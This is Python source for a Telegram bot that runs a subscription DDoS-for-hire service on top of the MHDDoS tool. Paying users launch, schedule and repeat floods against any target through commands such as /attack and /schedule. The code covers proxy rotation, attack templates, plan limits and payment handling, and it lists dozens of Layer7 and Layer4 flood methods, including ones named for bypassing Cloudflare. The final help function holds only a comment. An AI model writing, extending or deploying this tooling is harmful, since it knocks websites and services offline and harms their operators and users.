import os
import logging
import subprocess
import time
import asyncio
import datetime
from typing import Dict, Optional, List, Tuple, Any
import signal
import re
from functools import wraps

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, filters

# Import our modules
import templates
import scheduler
import stats
import users
import admin_commands
import user_commands

# Configuration
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your bot token
AUTHORIZED_USER_ID = 0000000000  # Replace with your Telegram user ID
MHDDOS_PATH = "PATH_TO_MHDDOS_DIRECTORY"  # Replace with path to MHDDoS directory
PROXY_PATH = "proxies.txt"  # Path to save proxy lists

# Set up logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Store running attack processes
running_attacks: Dict[str, Tuple[subprocess.Popen, str, Dict]] = {}

def authorized_only(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        
        # Check if this is an admin or a user with subscription
        if user_id != AUTHORIZED_USER_ID and not users.is_user_authorized(user_id):
            # Try to register the user if they don't exist
            user = users.get_user(user_id)
            if not user:
                users.add_user(
                    user_id,
                    update.effective_user.username or "Unknown",
                    update.effective_user.first_name or "Unknown"
                )
                
            # Send unauthorized message with subscription info
            keyboard = [[InlineKeyboardButton("📦 View Plans", callback_data="view_plans")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                "⚠️ You need an active subscription to use this command.\n\n"
                "View our subscription plans to get started.",
                reply_markup=reply_markup
            )
            
            logger.warning(f"Unauthorized access attempt by user ID: {user_id}")
            return
            
        return await func(update, context, *args, **kwargs)
    return wrapped

@authorized_only
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start an attack with the MHDDoS tool."""
    if not context.args or len(context.args) < 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: /attack [target] [method] [threads] [duration]"
        )
        return

    target = context.args[0]
    method = context.args[1].upper()
    
    # Validate threads and duration are integers
    try:
        threads = int(context.args[2])
        duration = int(context.args[3])
    except ValueError:
        await update.message.reply_text("❌ Threads and duration must be integers.")
        return
    
    # Validate target URL format for Layer7 attacks
    if method in get_layer7_methods() and not target.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Target URL must start with http:// or https://")
        return
    
    # Get user plan limits
    user_id = update.effective_user.id
    
    # Admin bypass for original authorized user
    if user_id != AUTHORIZED_USER_ID:
        limits = users.get_user_plan_limits(user_id)
        
        # Check if user has reached attack limit
        if limits["attacks_remaining"] == 0:
            await update.message.reply_text(
                "❌ You have reached your attack limit for this subscription.\n"
                "Upgrade your plan to perform more attacks."
            )
            return
        
        # Check duration limit
        if limits["max_duration"] > 0 and duration > limits["max_duration"]:
            await update.message.reply_text(
                f"❌ Maximum attack duration for your plan is {limits['max_duration']} seconds.\n"
                f"Please reduce the duration and try again."
            )
            return
        
        # Check threads limit
        if limits["max_threads"] > 0 and threads > limits["max_threads"]:
            await update.message.reply_text(
                f"❌ Maximum threads for your plan is {limits['max_threads']}.\n"
                f"Please reduce the number of threads and try again."
            )
            return
    
    # Create a unique ID for this attack
    attack_id = f"{method}-{int(time.time())}"
    
    # Check for optional proxy parameter
    use_proxy = False
    proxy_type = None
    if len(context.args) > 4:
        proxy_type = context.args[4].lower()
        if proxy_type in ["http", "socks4", "socks5"]:
            use_proxy = True
        else:
            await update.message.reply_text("❌ Invalid proxy type. Use http, socks4, or socks5.")
            return
    
    # Additional attack parameters
    attack_params = {
        "use_proxy": use_proxy,
        "proxy_type": proxy_type,
    }
    
    # Notify user that attack is starting
    proxy_info = f"\nProxy: {proxy_type}" if use_proxy else ""
    await update.message.reply_text(f"⚡ Starting {method} attack on {target}...\n"
                                  f"Threads: {threads}\n"
                                  f"Duration: {duration} seconds{proxy_info}\n"
                                  f"Attack ID: {attack_id}")
    
    try:
        # Prepare the command
        cmd = ["python3", "start.py", method, target, str(threads), "0", "0", str(duration)]
        
        # Add proxy if requested
        if use_proxy and os.path.exists(os.path.join(MHDDOS_PATH, PROXY_PATH)):
            cmd.append(proxy_type)
            cmd.append(PROXY_PATH)
        
        # Start the process in MHDDoS directory
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
            cwd=MHDDOS_PATH
        )
        
        # Store the process with parameters
        running_attacks[attack_id] = (process, target, attack_params)
        
        # Record attack start in statistics
        stats.record_attack_start(attack_id, target, method, threads, duration, proxy_type)
        
        # Record attack in user history if not the original authorized user
        if user_id != AUTHORIZED_USER_ID:
            users.record_attack(user_id, attack_id, target, method, threads, duration)
        
        # Send confirmation message
        await update.message.reply_text(f"✅ Attack {attack_id} started successfully!")
        
        # Start collecting output
        await collect_output(update, context, process, attack_id, duration)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error starting attack: {str(e)}")
        logger.error(f"Attack error: {str(e)}")

async def collect_output(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                         process: subprocess.Popen, attack_id: str, duration: int) -> None:
    """Collect and send output from the attack process."""
    if process.stdout is None:
        return
    
    # Set a maximum time to wait for output (slightly longer than attack duration)
    max_wait_time = duration + 10
    start_time = time.time()
    
    output_buffer = []
    last_send_time = time.time()
    
    # Send initial status message
    status_message = await update.message.reply_text(f"📊 Attack {attack_id} - Collecting output...")
    
    try:
        while process.poll() is None and (time.time() - start_time) < max_wait_time:
            # Read from stdout without blocking
            line = process.stdout.readline()
            if line:
                output_buffer.append(line.strip())
                
                # Send output every 5 seconds if we have new content
                current_time = time.time()
                if current_time - last_send_time >= 5 and output_buffer:
                    # Take the last 15 lines to avoid message too long errors
                    output_text = "\n".join(output_buffer[-15:])
                    await status_message.edit_text(f"📊 Attack {attack_id} - Output:\n```\n{output_text}\n```", 
                                                parse_mode="Markdown")
                    last_send_time = current_time
            
            # Small sleep to prevent CPU hogging
            await asyncio.sleep(0.1)
        
        # Final output update
        if output_buffer:
            output_text = "\n".join(output_buffer[-15:])
            await status_message.edit_text(f"📊 Attack {attack_id} - Final Output:\n```\n{output_text}\n```", 
                                         parse_mode="Markdown")
        
        # If process is still running after duration, terminate it
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            
            await update.message.reply_text(f"✅ Attack {attack_id} completed after {duration} seconds.")
        
        # Record attack end in statistics
        actual_duration = int(time.time() - start_time)
        stats.record_attack_end(attack_id, actual_duration)
        
        # Clean up
        if attack_id in running_attacks:
            del running_attacks[attack_id]
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error monitoring attack {attack_id}: {str(e)}")
        logger.error(f"Monitor error: {str(e)}")
        
        # Still record the attack end
        stats.record_attack_end(attack_id)

@authorized_only
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Stop all running attacks."""
    if not running_attacks:
        await update.message.reply_text("✅ No attacks are currently running.")
        return
    
    attack_count = len(running_attacks)
    
    for attack_id, (process, target, _) in list(running_attacks.items()):
        try:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            
            # Record attack end in statistics
            stats.record_attack_end(attack_id)
            
            del running_attacks[attack_id]
        except Exception as e:
            await update.message.reply_text(f"❌ Error stopping attack {attack_id}: {str(e)}")
            logger.error(f"Stop error: {str(e)}")
    
    await update.message.reply_text(f"✅ Stopped {attack_count} running attack(s).")

@authorized_only
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the status of running attacks."""
    if not running_attacks:
        await update.message.reply_text("✅ No attacks are currently running.")
        return
    
    status_message = "🔄 Running Attacks:\n\n"
    
    for attack_id, (process, target, params) in running_attacks.items():
        if process.poll() is None:
            status = "Running"
        else:
            status = f"Finished (code: {process.returncode})"
            
        status_message += f"ID: {attack_id}\n"
        status_message += f"Target: {target}\n"
        status_message += f"Status: {status}\n"
        
        # Add proxy info if used
        if params.get("use_proxy"):
            status_message += f"Proxy: {params.get('proxy_type')}\n"
            
        status_message += "\n"
    
    await update.message.reply_text(status_message)

@authorized_only
async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all available attack methods."""
    layer7_methods = get_layer7_methods()
    layer4_methods = get_layer4_methods()
    
    # Create inline keyboard with method categories
    keyboard = [
        [InlineKeyboardButton("Layer7 Methods", callback_data="methods_layer7")],
        [InlineKeyboardButton("Layer4 Methods", callback_data="methods_layer4")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📋 Select method category to view:", 
        reply_markup=reply_markup
    )

@authorized_only
async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Add proxies from URL or file."""
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ Invalid format. Use: /proxy [http/socks4/socks5] [url]"
        )
        return
    
    proxy_type = context.args[0].lower()
    proxy_url = context.args[1]
    
    if proxy_type not in ["http", "socks4", "socks5"]:
        await update.message.reply_text("❌ Invalid proxy type. Use http, socks4, or socks5.")
        return
    
    await update.message.reply_text(f"⏳ Downloading {proxy_type} proxies from {proxy_url}...")
    
    try:
        # Use requests to download the proxy list
        import requests
        response = requests.get(proxy_url, timeout=30)
        
        if response.status_code != 200:
            await update.message.reply_text(f"❌ Failed to download proxies. Status code: {response.status_code}")
            return
        
        # Save the proxies to a file
        proxy_path = os.path.join(MHDDOS_PATH, PROXY_PATH)
        with open(proxy_path, "w") as f:
            f.write(response.text)
        
        # Count the number of proxies
        proxy_count = len(response.text.splitlines())
        
        await update.message.reply_text(f"✅ Successfully downloaded {proxy_count} {proxy_type} proxies!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error downloading proxies: {str(e)}")
        logger.error(f"Proxy download error: {str(e)}")

@authorized_only
async def templates_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all available attack templates."""
    # Initialize templates if they don't exist
    templates.initialize_default_templates()
    
    template_list = templates.list_templates()
    
    if not template_list:
        await update.message.reply_text("No attack templates found. Use /create_template to create one.")
        return
    
    response = "📋 Available Attack Templates:\n\n"
    
    for template in template_list:
        name = template.pop("name")
        method = template.get("method", "")
        target = template.get("target", "")
        description = template.get("description", "")
        
        response += f"• {name}: {method} attack on {target}\n"
        if description:
            response += f"  {description}\n"
    
    response += "\nUse /template_info [name] to see details or /run_template [name] to run a template."
    
    await update.message.reply_text(response)

@authorized_only
async def template_info_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show detailed information about a template."""
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ Please specify a template name. Use: /template_info [name]")
        return
    
    template_name = context.args[0]
    template_data = templates.get_template(template_name)
    
    if not template_data:
        await update.message.reply_text(f"❌ Template '{template_name}' not found. Use /templates to list available templates.")
        return
    
    # Format template data for display
    formatted_template = templates.format_template_for_display(template_data)
    
    # Create buttons for template actions
    keyboard = [
        [InlineKeyboardButton("▶️ Run Template", callback_data=f"run_template:{template_name}")],
        [InlineKeyboardButton("🗑️ Delete Template", callback_data=f"delete_template:{template_name}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"📋 Template: {template_name}\n\n{formatted_template}",
        reply_markup=reply_markup
    )

@authorized_only
async def create_template_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Create a new attack template."""
    if not context.args or len(context.args) < 5:
        await update.message.reply_text(
            "❌ Invalid format. Use: /create_template [name] [target] [method] [threads] [duration] [description?]"
        )
        return
    
    name = context.args[0]
    target = context.args[1]
    method = context.args[2].upper()
    
    # Validate threads and duration are integers
    try:
        threads = int(context.args[3])
        duration = int(context.args[4])
    except ValueError:
        await update.message.reply_text("❌ Threads and duration must be integers.")
        return
    
    # Optional description
    description = " ".join(context.args[5:]) if len(context.args) > 5 else ""
    
    # Optional proxy type
    proxy_type = None
    if len(context.args) > 6 and context.args[6].lower() in ["http", "socks4", "socks5"]:
        proxy_type = context.args[6].lower()
    
    # Validate target URL format for Layer7 attacks
    if method in get_layer7_methods() and not target.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Target URL must start with http:// or https://")
        return
    
    # Create and save the template
    template = templates.create_template(name, target, method, threads, duration, description, proxy_type)
    if templates.add_template(name, template):
        await update.message.reply_text(f"✅ Template '{name}' created successfully!")
    else:
        await update.message.reply_text(f"❌ Failed to create template '{name}'.")

@authorized_only
async def run_template_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Run an attack using a template."""
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ Please specify a template name. Use: /run_template [name]")
        return
    
    template_name = context.args[0]
    template_data = templates.get_template(template_name)
    
    if not template_data:
        await update.message.reply_text(f"❌ Template '{template_name}' not found. Use /templates to list available templates.")
        return
    
    # Extract template parameters
    target = template_data["target"]
    method = template_data["method"]
    threads = template_data["threads"]
    duration = template_data["duration"]
    proxy_type = template_data.get("proxy_type")
    
    # Prepare context args for attack command
    context.args = [target, method, str(threads), str(duration)]
    if proxy_type:
        context.args.append(proxy_type)
    
    # Run the attack command
    await update.message.reply_text(f"⚡ Running template: {template_name}")
    await attack_command(update, context)

@authorized_only
async def delete_template_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Delete an attack template."""
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ Please specify a template name. Use: /delete_template [name]")
        return
    
    template_name = context.args[0]
    
    if templates.delete_template(template_name):
        await update.message.reply_text(f"✅ Template '{template_name}' deleted successfully!")
    else:
        await update.message.reply_text(f"❌ Template '{template_name}' not found.")

@authorized_only
async def schedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Schedule an attack for a specific time."""
    if not context.args or len(context.args) < 5:
        await update.message.reply_text(
            "❌ Invalid format. Use: /schedule [target] [method] [threads] [duration] [time] [proxy_type?] [repeat?]"
        )
        return

    target = context.args[0]
    method = context.args[1].upper()
    
    # Validate threads and duration are integers
    try:
        threads = int(context.args[2])
        duration = int(context.args[3])
    except ValueError:
        await update.message.reply_text("❌ Threads and duration must be integers.")
        return
    
    # Validate and parse time
    time_str = context.args[4]
    try:
        if ":" in time_str:
            # Format: HH:MM or HH:MM:SS
            parts = time_str.split(":")
            if len(parts) == 2:
                hour, minute = parts
                now = datetime.datetime.now()
                scheduled_time = now.replace(hour=int(hour), minute=int(minute), second=0, microsecond=0)
                
                # If the time has already passed today, schedule for tomorrow
                if scheduled_time < now:
                    scheduled_time += datetime.timedelta(days=1)
            else:
                await update.message.reply_text("❌ Invalid time format. Use HH:MM.")
                return
        elif "/" in time_str:
            # Format: MM/DD/YYYY HH:MM
            if len(context.args) < 6:
                await update.message.reply_text("❌ When using date format, provide time as separate argument: MM/DD/YYYY HH:MM")
                return
            
            date_str = time_str
            time_parts = context.args[5].split(":")
            
            if len(time_parts) != 2:
                await update.message.reply_text("❌ Invalid time format. Use HH:MM.")
                return
            
            date_parts = date_str.split("/")
            if len(date_parts) != 3:
                await update.message.reply_text("❌ Invalid date format. Use MM/DD/YYYY.")
                return
            
            month, day, year = date_parts
            hour, minute = time_parts
            
            scheduled_time = datetime.datetime(
                int(year), int(month), int(day), int(hour), int(minute), 0
            )
            
            # Adjust args for proxy and repeat
            context.args = context.args[1:]
        else:
            await update.message.reply_text("❌ Invalid time format. Use HH:MM or MM/DD/YYYY HH:MM.")
            return
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid date/time: {str(e)}")
        return
    
    # Check if the scheduled time is in the past
    if scheduled_time < datetime.datetime.now():
        await update.message.reply_text("❌ Cannot schedule an attack in the past.")
        return
    
    # Check for optional parameters
    proxy_type = None
    repeat = None
    
    if len(context.args) > 5:
        for arg in context.args[5:]:
            if arg.lower() in ["http", "socks4", "socks5"]:
                proxy_type = arg.lower()
            elif arg.lower() in ["daily", "weekly"]:
                repeat = arg.lower()
    
    # Validate target URL format for Layer7 attacks
    if method in get_layer7_methods() and not target.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Target URL must start with http:// or https://")
        return
    
    # Description is optional
    description = f"Scheduled {method} attack on {target}"
    
    # Schedule the attack
    iso_time = scheduled_time.isoformat()
    schedule_id = scheduler.schedule_attack(
        target, method, threads, duration, iso_time, description, proxy_type, repeat
    )
    
    if not schedule_id:
        await update.message.reply_text("❌ Failed to schedule the attack.")
        return
    
    # Format response
    repeat_info = f", repeating {repeat}" if repeat else ""
    time_display = scheduled_time.strftime("%Y-%m-%d %H:%M:%S")
    
    await update.message.reply_text(
        f"✅ Attack scheduled successfully!\n"
        f"ID: {schedule_id}\n"
        f"Target: {target}\n"
        f"Method: {method}\n"
        f"Time: {time_display}{repeat_info}\n"
        f"Threads: {threads}\n"
        f"Duration: {duration} seconds"
    )
    
    # Set up the scheduler if not already running
    _setup_attack_scheduler()

@authorized_only
async def schedule_template_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Schedule an attack using a template."""
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ Invalid format. Use: /schedule_template [name] [time] [repeat?]"
        )
        return
    
    template_name = context.args[0]
    
    # Get the template
    template_data = templates.get_template(template_name)
    if not template_data:
        await update.message.reply_text(f"❌ Template '{template_name}' not found.")
        return
    
    # Validate and parse time (similar to schedule_command)
    time_str = context.args[1]
    try:
        if ":" in time_str:
            # Format: HH:MM or HH:MM:SS
            parts = time_str.split(":")
            if len(parts) == 2:
                hour, minute = parts
                now = datetime.datetime.now()
                scheduled_time = now.replace(hour=int(hour), minute=int(minute), second=0, microsecond=0)
                
                # If the time has already passed today, schedule for tomorrow
                if scheduled_time < now:
                    scheduled_time += datetime.timedelta(days=1)
            else:
                await update.message.reply_text("❌ Invalid time format. Use HH:MM.")
                return
        elif "/" in time_str:
            # Format: MM/DD/YYYY HH:MM
            if len(context.args) < 3:
                await update.message.reply_text("❌ When using date format, provide time as separate argument: MM/DD/YYYY HH:MM")
                return
            
            date_str = time_str
            time_parts = context.args[2].split(":")
            
            if len(time_parts) != 2:
                await update.message.reply_text("❌ Invalid time format. Use HH:MM.")
                return
            
            date_parts = date_str.split("/")
            if len(date_parts) != 3:
                await update.message.reply_text("❌ Invalid date format. Use MM/DD/YYYY.")
                return
            
            month, day, year = date_parts
            hour, minute = time_parts
            
            scheduled_time = datetime.datetime(
                int(year), int(month), int(day), int(hour), int(minute), 0
            )
            
            # Adjust args for repeat
            context.args = context.args[1:]
        else:
            await update.message.reply_text("❌ Invalid time format. Use HH:MM or MM/DD/YYYY HH:MM.")
            return
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid date/time: {str(e)}")
        return
    
    # Check if the scheduled time is in the past
    if scheduled_time < datetime.datetime.now():
        await update.message.reply_text("❌ Cannot schedule an attack in the past.")
        return
    
    # Check for repeat parameter
    repeat = None
    if len(context.args) > 2:
        for arg in context.args[2:]:
            if arg.lower() in ["daily", "weekly"]:
                repeat = arg.lower()
    
    # Extract template data
    target = template_data["target"]
    method = template_data["method"]
    threads = template_data["threads"]
    duration = template_data["duration"]
    proxy_type = template_data.get("proxy_type")
    description = template_data.get("description", f"Scheduled {method} attack on {target}")
    
    # Schedule the attack
    iso_time = scheduled_time.isoformat()
    schedule_id = scheduler.schedule_attack(
        target, method, threads, duration, iso_time, description, proxy_type, repeat, template_name
    )
    
    if not schedule_id:
        await update.message.reply_text("❌ Failed to schedule the attack.")
        return
    
    # Format response
    repeat_info = f", repeating {repeat}" if repeat else ""
    time_display = scheduled_time.strftime("%Y-%m-%d %H:%M:%S")
    
    await update.message.reply_text(
        f"✅ Template attack scheduled successfully!\n"
        f"ID: {schedule_id}\n"
        f"Template: {template_name}\n"
        f"Time: {time_display}{repeat_info}"
    )
    
    # Set up the scheduler if not already running
    _setup_attack_scheduler()

@authorized_only
async def schedules_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all scheduled attacks."""
    schedules = scheduler.list_schedules()
    
    if not schedules:
        await update.message.reply_text("No scheduled attacks found.")
        return
    
    # Sort schedules by time
    schedules.sort(key=lambda s: s.get("time", ""))
    
    # Filter out completed schedules unless --all flag is used
    show_all = False
    if context.args and "--all" in context.args:
        show_all = True
    else:
        schedules = [s for s in schedules if not s.get("completed", False)]
        if not schedules:
            await update.message.reply_text("No pending scheduled attacks found. Use /schedules --all to see completed schedules.")
            return
    
    response = "📅 Scheduled Attacks:\n\n"
    
    for schedule in schedules:
        schedule_id = schedule.pop("id")
        
        # Convert time string to datetime
        try:
            schedule_time = datetime.datetime.fromisoformat(schedule["time"])
            time_str = schedule_time.strftime("%Y-%m-%d %H:%M:%S")
        except (ValueError, KeyError):
            time_str = schedule.get("time", "Unknown")
        
        if "template" in schedule and schedule["template"]:
            response += f"ID: {schedule_id} (Template: {schedule['template']})\n"
        else:
            method = schedule.get("method", "Unknown")
            target = schedule.get("target", "Unknown")
            response += f"ID: {schedule_id} ({method} → {target})\n"
        
        response += f"Time: {time_str}\n"
        
        if "repeat" in schedule and schedule["repeat"]:
            response += f"Repeat: {schedule['repeat'].capitalize()}\n"
        
        if "completed" in schedule:
            status = "Completed" if schedule["completed"] else "Pending"
            response += f"Status: {status}\n"
        
        response += "\n"
    
    response += "Use /cancel_schedule [id] to cancel a scheduled attack."
    
    await update.message.reply_text(response)

@authorized_only
async def cancel_schedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Cancel a scheduled attack."""
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("❌ Please specify a schedule ID. Use: /cancel_schedule [id]")
        return
    
    schedule_id = context.args[0]
    
    if scheduler.cancel_schedule(schedule_id):
        await update.message.reply_text(f"✅ Scheduled attack {schedule_id} has been cancelled.")
    else:
        await update.message.reply_text(f"❌ Schedule {schedule_id} not found.")

@authorized_only
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show attack statistics."""
    attack_stats = stats.get_attack_stats()
    formatted_stats = stats.format_stats_for_display(attack_stats)
    
    await update.message.reply_text(formatted_stats)

@authorized_only
async def daily_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show daily attack statistics."""
    # Get number of days from args, default to 7
    days = 7
    if context.args and len(context.args) > 0:
        try:
            days = int(context.args[0])
            if days < 1:
                days = 1
            elif days > 30:
                days = 30
        except ValueError:
            pass
    
    daily_stats = stats.get_daily_stats(days)
    formatted_stats = stats.format_daily_stats_for_display(daily_stats)
    
    await update.message.reply_text(formatted_stats)

def _run_attack_from_scheduler(target: str, method: str, threads: int, duration: int, proxy_type: Optional[str] = None) -> None:
    """Run an attack from the scheduler."""
    logger.info(f"Executing scheduled attack: {method} on {target}")
    
    try:
        # Prepare the command
        cmd = ["python3", "start.py", method, target, str(threads), "0", "0", str(duration)]
        
        # Add proxy if requested
        if proxy_type and os.path.exists(os.path.join(MHDDOS_PATH, PROXY_PATH)):
            cmd.append(proxy_type)
            cmd.append(PROXY_PATH)
        
        # Generate a unique ID for this attack
        attack_id = f"{method}-{int(time.time())}"
        
        # Start the process in MHDDoS directory
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
            cwd=MHDDOS_PATH
        )
        
        # Store the process
        running_attacks[attack_id] = (process, target, {"use_proxy": bool(proxy_type), "proxy_type": proxy_type})
        
        logger.info(f"Scheduled attack {attack_id} started successfully")
        
        # We won't collect output for scheduled attacks
        
    except Exception as e:
        logger.error(f"Error executing scheduled attack: {str(e)}")

def _get_template(template_name: str) -> Optional[Dict[str, Any]]:
    """Get a template by name, for the scheduler."""
    return templates.get_template(template_name)

def _setup_attack_scheduler() -> None:
    """Set up the attack scheduler."""
    scheduler.setup_scheduler(_run_attack_from_scheduler, _get_template)

def get_layer7_methods() -> List[str]:
    """Return a list of Layer7 attack methods."""
    return [
        "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER", 
        "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", 
        "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB", 
        "KILLER", "TOR"
    ]

def get_layer4_methods() -> List[str]:
    """Return a list of Layer4 attack methods."""
    return [
        "TCP", "UDP", "SYN", "CPS", "ICMP", "CONNECTION", "VSE", "TS3",
        "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE", "DNS", "CHAR",
        "CLDAP", "ARD", "RDP"
    ]

def main() -> None:
    """Start the bot."""
    # Create the Application
    application = Application.builder().token(TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("methods", methods_command))
    application.add_handler(CommandHandler("proxy", proxy_command))
    
    # Add template command handlers
    application.add_handler(CommandHandler("templates", templates_command))
    application.add_handler(CommandHandler("template_info", template_info_command))
    application.add_handler(CommandHandler("create_template", create_template_command))
    application.add_handler(CommandHandler("run_template", run_template_command))
    application.add_handler(CommandHandler("delete_template", delete_template_command))
    
    # Add scheduler command handlers
    application.add_handler(CommandHandler("schedule", schedule_command))
    application.add_handler(CommandHandler("schedule_template", schedule_template_command))
    application.add_handler(CommandHandler("schedules", schedules_command))
    application.add_handler(CommandHandler("cancel_schedule", cancel_schedule_command))
    
    # Add statistics command handlers
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("daily_stats", daily_stats_command))
    
    # Add user command handlers
    application.add_handler(CommandHandler("plans", user_commands.plans_command))
    application.add_handler(CommandHandler("subscription", user_commands.subscription_command))
    application.add_handler(CommandHandler("payment", user_commands.payment_command))
    application.add_handler(CommandHandler("redeem", user_commands.redeem_command))
    application.add_handler(CommandHandler("purchase", user_commands.purchase_command))
    application.add_handler(CommandHandler("history", user_commands.history_command))
    
    # Add admin command handlers
    application.add_handler(CommandHandler("admin_help", admin_commands.admin_help_command))
    application.add_handler(CommandHandler("admin_users", admin_commands.admin_users_command))
    application.add_handler(CommandHandler("admin_user", admin_commands.admin_user_command))
    application.add_handler(CommandHandler("admin_make_admin", admin_commands.admin_make_admin_command))
    application.add_handler(CommandHandler("admin_transactions", admin_commands.admin_transactions_command))
    application.add_handler(CommandHandler("admin_approve", admin_commands.admin_approve_command))
    application.add_handler(CommandHandler("admin_reject", admin_commands.admin_reject_command))
    application.add_handler(CommandHandler("admin_plans", admin_commands.admin_plans_command))
    application.add_handler(CommandHandler("admin_plan", admin_commands.admin_plan_command))
    application.add_handler(CommandHandler("admin_generate_codes", admin_commands.admin_generate_codes_command))
    application.add_handler(CommandHandler("admin_stats", admin_commands.admin_stats_command))
    
    # Add callback query handler
    application.add_handler(CallbackQueryHandler(user_commands.button_callback))

    # Initialize templates
    templates.initialize_default_templates()
    
    # Initialize statistics
    stats.initialize()
    
    # Initialize user management
    users.initialize()
    
    # Set up the scheduler
    _setup_attack_scheduler()
    
    # Run the bot until the user presses Ctrl-C
    application.run_polling()

@authorized_only
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    # Register user if not exists
    user_id = update.effective_user.id
    user = users.get_user(user_id)
    
    if not user and user_id != AUTHORIZED_USER_ID:
        users.add_user(
            user_id,
            update.effective_user.username or "Unknown",
            update.effective_user.first_name or "Unknown"
        )
    
    # Check if user is admin
    is_admin = users.is_user_admin(user_id) or user_id == AUTHORIZED_USER_ID
    
    # Core commands for all users
    command_text = (
        "MHDDoS Telegram Controller Bot\n\n"
        "Commands:\n"
        "/attack [target] [method] [threads] [duration] - Start an attack\n"
        "/stop - Stop all running attacks\n"
        "/status - Show running attacks\n"
        "/methods - List available attack methods\n"
        "/proxy [http/socks4/socks5] [url] - Add proxies\n"
        "/templates - List attack templates\n"
        "/template_info [name] - Show template details\n"
        "/create_template [name] [target] [method] [threads] [duration] [description] - Create a template\n"
        "/run_template [name] - Run an attack template\n"
        "/delete_template [name] - Delete a template\n"
        "/schedule [target] [method] [threads] [duration] [time] - Schedule an attack\n"
        "/schedule_template [name] [time] - Schedule an attack using a template\n"
        "/schedules - List scheduled attacks\n"
        "/cancel_schedule [id] - Cancel a scheduled attack\n"
        "/stats - View attack statistics\n"
        "/daily_stats - View daily attack statistics\n"
    )
    
    # User-specific subscription commands
    subscription_text = (
        "\nSubscription Commands:\n"
        "/plans - View available subscription plans\n"
        "/subscription - View your subscription details\n"
        "/payment - View payment options\n"
        "/redeem [code] - Redeem a subscription code\n"
        "/purchase [plan_id] [payment_method] [payment_id] - Record a purchase\n"
        "/history - View your attack history\n"
    )
    
    # Admin-specific commands
    admin_text = (
        "\nAdmin Commands:\n"
        "/admin_help - View admin commands\n"
        "/admin_users - List all users\n"
        "/admin_user [user_id] - View user details\n"
        "/admin_transactions - View pending transactions\n"
        "/admin_approve [transaction_id] [note] - Approve a transaction\n"
        "/admin_reject [transaction_id] [reason] - Reject a transaction\n"
        "/admin_plans - List all subscription plans\n"
        "/admin_generate_codes [plan_id] [count] - Generate redeem codes\n"
    )
    
    # Combine command sections based on user role
    full_text = command_text
    
    if user_id != AUTHORIZED_USER_ID:
        full_text += subscription_text
    
    if is_admin:
        full_text += admin_text
    
    full_text += "\n/help - Show this help message"
    
    await update.message.reply_text(full_text)

@authorized_only
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /help is issued."""
    # Same logic as start_command
